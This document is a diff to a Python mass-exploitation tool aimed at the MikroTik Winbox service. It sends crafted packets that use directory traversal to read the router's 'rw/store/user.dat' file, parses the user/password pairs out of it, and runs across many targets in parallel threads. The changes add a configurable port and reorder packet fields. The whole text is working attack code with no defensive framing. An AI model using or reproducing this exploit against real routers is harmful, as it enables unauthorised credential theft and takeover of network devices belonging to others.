@@ -36,6 +36,7 @@ DEBUG = False
 targets = []
 number_of_threads = 50
 log = False
+winbox_port = 8291
 
 # mtPacket
 class mtPacket(object):
@@ -155,7 +156,7 @@ class mtTCPSession(object):
 		if timeout:
 			self.socket.settimeout(self.timeout)
 		try:
-			self.socket.connect((self.host, self.port))
+			self.socket.connect((self.host, int(self.port)))
 		except:
 			self.ready = False
 			raise Exception('Connection error to %s:%s' % (self.host, self.port))
@@ -201,25 +202,28 @@ class mtTCPSession(object):
 def h(msg, data):
 	print(msg, binascii.hexlify(data).decode('UTF-8'))
 
+
 def mt_freq_01(filename):
 	m2 = mtPacket()
-	m2.add(MT_RECEIVER, MT_ARRAY, [2, 2])
-	m2.add(MT_COMMAND, MT_BYTE, 7)
-	m2.add(MT_REQUEST_ID, MT_BYTE, 1)
 	m2.add(MT_REPLY_EXPECTED, MT_BOOL, True)
-	m2.add(1, MT_STRING, filename)
+	m2.add(MT_REQUEST_ID, MT_BYTE, 7)
+	m2.add(MT_COMMAND, MT_BYTE, 7)
+	m2.add(0x000001, MT_STRING, filename)
+	m2.add(MT_SENDER, MT_ARRAY, [0, 8])
+	m2.add(MT_RECEIVER, MT_ARRAY, [2, 2])
 	m2.build()
 	return m2
 
 def mt_freq_02(sid):
 	id, type, value = sid
 	m2 = mtPacket()
-	m2.add(MT_RECEIVER, MT_ARRAY, [2, 2])
-	m2.add(MT_COMMAND, MT_BYTE, 4)
-	m2.add(MT_REQUEST_ID, MT_BYTE, 1)
-	m2.add(id, type, value)
 	m2.add(MT_REPLY_EXPECTED, MT_BOOL, True)
-	m2.add(2, MT_DWORD, 0x8000)
+	m2.add(MT_REQUEST_ID, MT_BYTE, 0)
+	m2.add(id, type, value)
+	m2.add(0x000002, MT_DWORD, 0x8000)
+	m2.add(MT_COMMAND, MT_BYTE, 4)
+	m2.add(MT_SENDER, MT_ARRAY, [0, 8])
+	m2.add(MT_RECEIVER, MT_ARRAY, [2, 2])
 	m2.build()
 	return m2
 
@@ -317,40 +321,40 @@ def get_userdat(target):
 	result = []
 
 	try:
-		print('[*] Connecting to %s...' % target)
-		s = mtTCPSession(target, 8291, TIMEOUT)
+		print('[*] Connecting to %s:%s...' % (target, winbox_port))
+		s = mtTCPSession(target, winbox_port, TIMEOUT)
 		s.connect()
 		if not s.ready:
-			print('[-] ERROR connecting to %s' % target)
+			print('[-] ERROR connecting to %s:%s' % (target, winbox_port))
 			return None
 	except:
-		print('[-] ERROR connecting to %s' % target)
+		print('[-] ERROR connecting to %s:%s' % (target, winbox_port))
 		s.close()
 		return None
 	p1 = mt_freq_01('./.././.././.././.././../rw/store/user.dat')
 	try:
 		if DEBUG:
-			print('[*] Sending the 1st packet to %s...' % target)
+			print('[*] Sending the 1st packet to %s:%s...' % (target, winbox_port))
 		s.send_packet(p1)
 	except:
 		if DEBUG:
-			print('[-] ERROR sending the 1st packet to %s' % target)
+			print('[-] ERROR sending the 1st packet to %s:%s' % (target, winbox_port))
 		s.close()
 		return None
 	try:
 		if DEBUG:
-			print('[*] Reading the response to the 1st packet from %s...' % target)
+			print('[*] Reading the response to the 1st packet from %s:%s...' % (target, winbox_port))
 		r1 = s.recv_packet(1024)
 	except:
 		if DEBUG:
-			print('[-] ERROR reading response to the 1st packet from %s' % target)
+			print('[-] ERROR reading response to the 1st packet from %s:%s' % (target, winbox_port))
 		s.close()
 		return None
 	if DEBUG and r1 is not None:
 		h('r1', r1.raw)
 	fsize = mt_get_fsize(r1)
 	if fsize is None:
-		print('[-] ERROR reading user database file size from %s' % target)
+		print('[-] ERROR reading user database file size from %s:%s' % (target, winbox_port))
 		s.close()
 		return None
 	if DEBUG:
@@ -358,27 +362,27 @@ def get_userdat(target):
 	sid = mt_get_sid(r1)
 	if sid is None:
 		if DEBUG:
-			print('[-] ERROR reading session id from %s' % target)
+			print('[-] ERROR reading session id from %s:%s' % (target, winbox_port))
 		s.close()
 		return None
 	p2 = mt_freq_02(sid)
 	try:
 		if DEBUG:
-			print('[*] Sending the 2nd packet to %s...' % target)
+			print('[*] Sending the 2nd packet to %s:%s...' % (target, winbox_port))
 		s.send_packet(p2)
 	except:
 		if DEBUG:
-			print('[-] ERROR sending the 2nd packet to %s' % target)
+			print('[-] ERROR sending the 2nd packet to %s:%s' % (target, winbox_port))
 		s.close()
 		return None
 	try:
 		if DEBUG:
-			print('[*] Reading the response to the 2nd packet from %s...' % target)
+			print('[*] Reading the response to the 2nd packet from %s:%s...' % (target, winbox_port))
 		time.sleep(0.1)
 		r2 = s.recv_bytes(fsize + 128)
 	except:
 		if DEBUG:
-			print('[-] ERROR reading response to the 2nd packet from %s' % target)
+			print('[-] ERROR reading response to the 2nd packet from %s:%s' % (target, winbox_port))
 		s.close()
 		return None
 	if r2 is not None:
@@ -391,7 +395,7 @@ def get_userdat(target):
 
 		if user_pass is None:
 			if DEBUG:
-				print('[-] ERROR no user/password pairs has been parsed from %s' % target)
+				print('[-] ERROR no user/password pairs has been parsed from %s:%s' % (target, winbox_port))
 			s.close()
 			return None
 
@@ -416,6 +420,7 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description='description')
 	parser.add_argument('-t', '--target', help = 'Single target', required = False)
 	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
+	parser.add_argument('-p', '--port', help = 'Winbox service port', required = False)
 	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
 	parser.add_argument('--log', help = 'Write log file', required = False)
 	parser.add_argument('--debug', action = 'store_true', help = 'Debug mode', required = False)
@@ -446,13 +451,16 @@ if __name__ == '__main__':
 	if args['threads']:
 		number_of_threads = args['threads']
 
+	if args['port']:
+		winbox_port = args['port']
+
 	if args['log']:
 		log = True
 		log_filename = args['log']
 		log_file = open(log_filename, 'a')
 
 	print('[*] Starting with %s threads' % number_of_threads)
-	pool = Pool(processes = number_of_threads)
+	pool = Pool(processes = int(number_of_threads))
 	results = pool.map(get_userdat, targets)
 	pool.close()
 	pool.join()
